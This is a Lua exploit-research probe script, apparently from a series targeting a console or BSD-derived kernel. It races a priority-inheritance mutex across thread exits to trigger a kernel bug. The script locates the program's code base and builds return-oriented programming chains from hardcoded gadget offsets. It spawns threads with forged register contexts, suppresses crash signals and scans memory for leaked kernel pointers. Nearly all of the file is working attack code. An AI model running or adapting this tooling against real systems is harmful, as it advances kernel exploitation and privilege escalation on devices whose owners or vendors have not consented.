-- CRASH_CLASS: MODERATE
-- PROBE 160f: PI-mutex multi-contender EXIT cascade race
--
-- 3 child threads contend on one PI mutex via sa (real kernel syscalls).
-- Thread A: LOCK → nanosleep(2ms) → thr_exit
-- Thread B: LOCK (blocks) → store result → thr_exit
-- Thread C: LOCK (blocks) → store result → thr_exit
-- When A exits, kernel's umtx_thread_cleanup wakes B+C simultaneously.
-- Both enter do_lock_pi at the same time → race in PI chain manipulation.
--
-- Prior coverage:
--   97b: exit + 1 contender (clean). 128b: lock/unlock no exit (clean).
--   160b-e: multi-child lock/unlock (clean). None tested multi-waiter EXIT cascade.
--
-- Section A: 3-child EXIT cascade (10 rounds)
-- Section B: 1-child tight EXIT race — main contends during cleanup (20 rounds)
-- After each round: scan mutex area for kernel pointer leaks.

print("=== PROBE 160f: PI MULTI-CONTENDER EXIT CASCADE ===")
print("")
collectgarbage("stop")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function fmt(v)
    if v == nil then return "nil" end
    local h, l
    if type(v) == "table" and v.h then h, l = v.h, v.l
    else h, l = 0, N(v) end
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X%08X", h, l)
end

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid end

local sa = syscall.syscall_address

-- Eboot base
local info = memory.alloc(0x200)
wd(N(info), 0x160)
pcall(function() mk(593)(uint64(0), info) end)
local text_lo = rd(N(info) + 0x108) or 0
local text_hi = rd(N(info) + 0x10C) or 0
if text_lo < 0 then text_lo = text_lo + 0x100000000 end
if text_hi < 0 then text_hi = text_hi + 0x100000000 end
print(string.format("eboot=0x%X%08X", text_hi, text_lo))

local function eaddr(off)
    return uint64(string.format("0x%X%08X", text_hi, text_lo + off))
end

local G = {
    ret      = 0x42,
    pop_rax  = 0x992,
    pop_rdi  = 0xC9DFE,
    pop_rsi  = 0xD77D,
    mov_w    = 0x92C67,
    jmp_loop = 0x15481,
}

local rip_lo = (text_lo + G.ret) % 0x100000000
local rip_hi = text_hi + math.floor((text_lo + G.ret) / 0x100000000)

-- Signal handlers: ignore SIGSYS(12), SIGSEGV(11), SIGBUS(10), SIGPIPE(13)
local sc_sigaction = mk(416)
local act = memory.alloc(0x40)
for off = 0, 0x3C, 4 do wd(N(act) + off, 0) end
for _, sig in ipairs({12, 11, 10, 13, 4}) do
    wq(N(act), uint64(1)); wd(N(act) + 8, 0)
    pcall(function() sc_sigaction(uint64(sig), act, uint64(0), uint64(0), uint64(0), uint64(0)) end)
end
print("signals ignored")

-- Shared area
local shared = memory.alloc(0x200)
local MUTEX  = N(shared)          -- PI mutex word (dword)
local EXIT_A = N(shared) + 0x10   -- thr_exit writes 1 here
local EXIT_B = N(shared) + 0x20
local EXIT_C = N(shared) + 0x30
local RET_B  = N(shared) + 0x40   -- LOCK return value
local RET_C  = N(shared) + 0x50
local SCAN   = N(shared) + 0x60   -- scan area for leak check

-- Timespec: 2ms
local ts = memory.alloc(16)
wq(N(ts), uint64(0))
wq(N(ts) + 8, uint64(2000000))

-- Stack memory: 3 children × 0x8000 each
local stk_pool = memory.alloc(0x20000)
local function stk_base(idx) return N(stk_pool) + idx * 0x8000 + 0x4000 end

-- Thread context (reusable)
local ctx = memory.alloc(0x500)
local tid_buf = memory.alloc(8)

local function spawn(chain_base)
    local BC = N(ctx)
    for off = 0, 0x4BC, 4 do wd(BC + off, 0) end
    wd(BC + 0x108, 0x480)
    wd(BC + 0xD0, 0)
    wd(BC + 0x110, 0x10000)
    wd(BC + 0xC0, 0x43)
    wd(BC + 0x100, 0x3B)
    wd(BC + 0xE0, rip_lo)
    wd(BC + 0xE4, rip_hi)
    local rsp_lo = chain_base % 0x100000000
    local rsp_hi = math.floor(chain_base / 0x100000000)
    wd(BC + 0xF8, rsp_lo)
    wd(BC + 0xFC, rsp_hi)
    wq(N(tid_buf), uint64("0x0"))
    local tr = nil
    pcall(function() tr = mk(430)(ctx, tid_buf, uint64(0)) end)
    return tr
end

-- Chain builder helpers
local function cp(base, p, val)
    wq(base + p, val)
    return p + 8
end

local function chain_umtx_lock(base, p, mutex_addr)
    p = cp(base, p, eaddr(G.pop_rax)); p = cp(base, p, uint64(454))
    p = cp(base, p, eaddr(G.pop_rdi)); p = cp(base, p, uint64(string.format("0x%X", mutex_addr)))
    p = cp(base, p, eaddr(G.pop_rsi)); p = cp(base, p, uint64(5))
    -- rdx stays 0 from context init (pop_rdx gadget untested in child threads)
    p = cp(base, p, sa)
    return p
end

local function chain_store_rax(base, p, dst_addr)
    p = cp(base, p, eaddr(G.pop_rdi)); p = cp(base, p, uint64(string.format("0x%X", dst_addr)))
    p = cp(base, p, eaddr(G.mov_w))
    return p
end

local function chain_nanosleep(base, p, ts_addr)
    p = cp(base, p, eaddr(G.pop_rax)); p = cp(base, p, uint64(240))
    p = cp(base, p, eaddr(G.pop_rdi)); p = cp(base, p, uint64(string.format("0x%X", ts_addr)))
    p = cp(base, p, eaddr(G.pop_rsi)); p = cp(base, p, uint64(0))
    p = cp(base, p, sa)
    return p
end

local function chain_thr_exit(base, p, state_addr)
    p = cp(base, p, eaddr(G.pop_rax)); p = cp(base, p, uint64(431))
    p = cp(base, p, eaddr(G.pop_rdi)); p = cp(base, p, uint64(string.format("0x%X", state_addr)))
    p = cp(base, p, sa)
    return p
end

local function chain_spin(base, p)
    p = cp(base, p, eaddr(G.jmp_loop))
    return p
end

-- Check for kernel pointers in buffer
local function check_kptr(addr, len, label)
    local found = 0
    for off = 0, len - 8, 4 do
        local q = rq(addr + off)
        if q then
            local h = 0
            if type(q) == "table" and q.h then h = q.h end
            if h < 0 then h = h + 0x100000000 end
            if h >= 0xFFFF8000 and h < 0xFFFFFFFF then
                print(string.format("  *** KPTR %s+0x%X: %s ***", label, off, fmt(q)))
                found = found + 1
            end
        end
    end
    return found
end

-- Wait for a sentinel to become non-zero (with timeout)
local function wait_sentinel(addr, max_iters)
    for i = 1, (max_iters or 100000) do
        local v = rd(addr)
        if v and v ~= 0 then return true, i end
        if i % 1000 == 0 then native.fcall_with_rax(stub, 20) end
    end
    return false, 0
end

local function zero_shared()
    for off = 0, 0x5F, 4 do wd(N(shared) + off, 0) end
end

local sc_umtx = mk(454)
local total_kptr = 0
local total_anomaly = 0

-- ========== SECTION A: 3-child EXIT cascade ==========
print("")
print("[A] 3-child PI EXIT cascade (10 rounds)")
print("")

for round = 1, 10 do
    if not alive() then
        print(string.format("  DIED at round %d!", round))
        break
    end

    zero_shared()

    print(string.format("  R%d: building chains...", round))
    -- Build chain A: LOCK → nanosleep(2ms) → thr_exit
    local ba = stk_base(0)
    local p = 0
    p = chain_umtx_lock(ba, p, MUTEX)
    p = chain_nanosleep(ba, p, N(ts))
    p = chain_thr_exit(ba, p, EXIT_A)

    -- Build chain B: LOCK → store rax → thr_exit
    local bb = stk_base(1)
    p = 0
    p = chain_umtx_lock(bb, p, MUTEX)
    p = chain_store_rax(bb, p, RET_B)
    p = chain_thr_exit(bb, p, EXIT_B)

    -- Build chain C: LOCK → store rax → thr_exit
    local bc = stk_base(2)
    p = 0
    p = chain_umtx_lock(bc, p, MUTEX)
    p = chain_store_rax(bc, p, RET_C)
    p = chain_thr_exit(bc, p, EXIT_C)

    -- Spawn all 3
    print(string.format("  R%d: spawning A...", round))
    local tra = spawn(ba)
    print(string.format("  R%d: A=%s, spawning B...", round, fmt(tra)))
    local trb = spawn(bb)
    print(string.format("  R%d: B=%s, spawning C...", round, fmt(trb)))
    local trc = spawn(bc)
    print(string.format("  R%d: C=%s, waiting...", round, fmt(trc)))

    -- Wait for all exits (generous timeout)
    local all_done = true
    for _, addr in ipairs({EXIT_A, EXIT_B, EXIT_C}) do
        local ok = wait_sentinel(addr, 200000)
        if not ok then all_done = false end
    end

    -- Read results
    local mword = rd(MUTEX)
    local rb = rq(RET_B)
    local rc = rq(RET_C)
    local ea = rd(EXIT_A) or 0
    local eb = rd(EXIT_B) or 0
    local ec = rd(EXIT_C) or 0

    local anomaly = false
    if not all_done then anomaly = true end
    if rb and N(rb) ~= 0 then anomaly = true end
    if rc and N(rc) ~= 0 then anomaly = true end

    local kp = check_kptr(N(shared), 0x60, "shared")
    total_kptr = total_kptr + kp

    if anomaly or kp > 0 then
        total_anomaly = total_anomaly + 1
        print(string.format("  R%d: ANOMALY mword=0x%X exits=%d/%d/%d retB=%s retC=%s kptr=%d",
            round, mword or -1, ea, eb, ec, fmt(rb), fmt(rc), kp))
    elseif round <= 3 or round == 10 then
        print(string.format("  R%d: ok mword=0x%X exits=%d/%d/%d retB=%s retC=%s",
            round, mword or -1, ea, eb, ec, fmt(rb), fmt(rc)))
    end
end

if not alive() then
    print("[A] PROCESS DIED!")
    print("=== 160f INCOMPLETE (death in A) ===")
    return
end

print(string.format("[A] done: anomalies=%d kptr=%d", total_anomaly, total_kptr))

-- ========== SECTION B: 1-child tight EXIT race ==========
print("")
print("[B] Tight EXIT race — main contends during cleanup (20 rounds)")
print("")

local b_anomaly = 0
local b_kptr = 0
local b_blocked = 0
local b_fast = 0

for round = 1, 20 do
    if not alive() then
        print(string.format("  DIED at round %d!", round))
        break
    end

    zero_shared()

    -- Build child chain: LOCK → sentinel → thr_exit (no sleep, instant exit)
    local bch = stk_base(0)
    p = 0
    p = chain_umtx_lock(bch, p, MUTEX)
    -- Store sentinel (marks "I locked")
    p = cp(bch, p, eaddr(G.pop_rdi)); p = cp(bch, p, uint64(string.format("0x%X", EXIT_A)))
    p = cp(bch, p, eaddr(G.pop_rax)); p = cp(bch, p, uint64("0xAAAAAAAAAAAAAAAA"))
    p = cp(bch, p, eaddr(G.mov_w))
    -- thr_exit immediately
    p = chain_thr_exit(bch, p, EXIT_B)

    spawn(bch)

    -- Main: spin briefly (let child lock), then contend
    for i = 1, 50 do native.fcall_with_rax(stub, 20) end

    -- Check if child already exited
    local child_exited = (rd(EXIT_B) or 0) ~= 0
    local child_locked = (rd(EXIT_A) or 0) ~= 0

    -- Main attempts LOCK — might block if child still owns, or succeed if child exited
    local mret = nil
    local mok = pcall(function()
        mret = sc_umtx(uint64(MUTEX), uint64(5), uint64(0), uint64(0), uint64(0))
    end)

    local exit_b = rd(EXIT_B) or 0
    local mword = rd(MUTEX)

    if mok and mret and N(mret) == 0 then
        -- Main got the lock. Clear it for next round.
        wd(MUTEX, 0)
        if child_exited then b_fast = b_fast + 1
        else b_blocked = b_blocked + 1 end
    end

    local kp = check_kptr(N(shared), 0x60, "shared")
    b_kptr = b_kptr + kp

    local anomaly = false
    if not mok then anomaly = true end
    if mret and N(mret) ~= 0 then anomaly = true end
    if kp > 0 then anomaly = true end

    if anomaly then
        b_anomaly = b_anomaly + 1
        print(string.format("  R%d: ANOMALY mok=%s mret=%s mword=0x%X locked=%s exited=%s kptr=%d",
            round, tostring(mok), fmt(mret), mword or -1,
            tostring(child_locked), tostring(child_exited), kp))
    elseif round <= 3 or round == 20 then
        print(string.format("  R%d: ok mret=%s mword=0x%X locked=%s exited=%s",
            round, fmt(mret), mword or -1, tostring(child_locked), tostring(child_exited)))
    end

    -- Wait for child to fully exit before next round
    wait_sentinel(EXIT_B, 100000)
    wd(MUTEX, 0)
end

if not alive() then
    print("[B] PROCESS DIED!")
    print("=== 160f INCOMPLETE (death in B) ===")
    return
end

print(string.format("[B] done: anomalies=%d kptr=%d blocked=%d fast=%d",
    b_anomaly, b_kptr, b_blocked, b_fast))

-- ========== SUMMARY ==========
print("")
print(string.format("TOTAL: anomalies=%d kptr=%d", total_anomaly + b_anomaly, total_kptr + b_kptr))
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 160f COMPLETE ===")
